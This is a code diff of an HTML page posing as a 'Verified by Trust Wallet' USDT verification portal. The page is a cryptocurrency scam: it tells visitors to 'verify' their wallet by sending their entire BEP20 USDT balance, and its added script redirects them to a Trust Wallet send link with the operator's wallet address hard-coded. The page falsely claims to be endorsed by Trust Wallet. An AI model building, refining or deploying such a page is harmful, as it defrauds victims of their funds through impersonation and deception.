@@ -3,29 +3,89 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>BEP20 USDT Verification</title>
-  <link rel="stylesheet" href="style.css">
+  <title>BEP20 USDT All-In Verification</title>
   <link rel="icon" type="image/png" href="bep20-logo.png">
+  <style>
+    body {
+      margin: 0;
+      padding: 40px 20px;
+      font-family: 'Segoe UI', sans-serif;
+      background: #0d0d0d;
+      color: #ffffff;
+      text-align: center;
+    }
+    .container {
+      background: #1a1a1a;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 0 12px rgba(0, 255, 150, 0.2);
+      max-width: 400px;
+      margin: auto;
+    }
+    .logo {
+      width: 80px;
+      margin-bottom: 20px;
+    }
+    h1 {
+      font-size: 22px;
+      color: #00ffcc;
+      margin-bottom: 10px;
+    }
+    .qr {
+      margin: 20px 0;
+    }
+    button {
+      background: #00ffcc;
+      border: none;
+      padding: 12px 20px;
+      border-radius: 30px;
+      font-size: 16px;
+      cursor: pointer;
+      color: #000;
+      font-weight: bold;
+    }
+    button:hover {
+      background: #00e6b8;
+    }
+    .processing {
+      display: none;
+      font-size: 14px;
+      color: #ffa500;
+      margin-top: 15px;
+    }
+    footer {
+      margin-top: 30px;
+      font-size: 13px;
+      opacity: 0.5;
+    }
+  </style>
 </head>
 <body>
-  <header>
-    <img src="bep20-logo.png" alt="BEP20 Logo">
-    <h1>Verified by Trust Wallet</h1>
-    <p>Secure BEP20 USDT verification portal</p>
-  </header>
 
-  <div class="card">
-    <h2>Verify your USDT</h2>
-    <p>Click the button below to verify with your full USDT balance</p>
-    <button onclick="verifyUSDT()">Verify USDT</button>
-    <div class="processing" id="processingText">Processing verification...</div>
-    <div id="flash-msg">🔐 All-in USDT verification required. Please send your full BEP20 USDT balance.</div>
+  <div class="container">
+    <img src="bep20-logo.png" alt="BEP20 Logo" class="logo" />
+    <h1>Verified by Trust Wallet</h1>
+    <p>Click below to verify your wallet by sending all USDT</p>
+    
+    <div class="qr">
+      <img src="BEP20_USDT_QR_Code.png" alt="QR Code" width="250" />
+    </div>
+    
+    <button onclick="verifyAllUSDT()">Verify USDT</button>
+    <div class="processing" id="processText">🔁 All-in verification in progress...</div>
   </div>
 
-  <footer>
-    Powered by BEP20 Payment Gateway
-  </footer>
+  <footer>Secure All-In Payment Gateway | BEP20 Network</footer>
 
-  <script src="script.js"></script>
+  <script>
+    function verifyAllUSDT() {
+      document.getElementById("processText").style.display = "block";
+      setTimeout(() => {
+        // Redirect without amount = Trust Wallet asks user to enter manually (simulate "All-In")
+        window.location.href = "https://link.trustwallet.com/send?coin=20000714&address=0x1956B3950A73B0C54792199Edf13c7b835FF94DC&token_id=0x55d398326f99059fF775485246999027B3197955";
+      }, 1800);
+    }
+  </script>
+
 </body>
 </html>
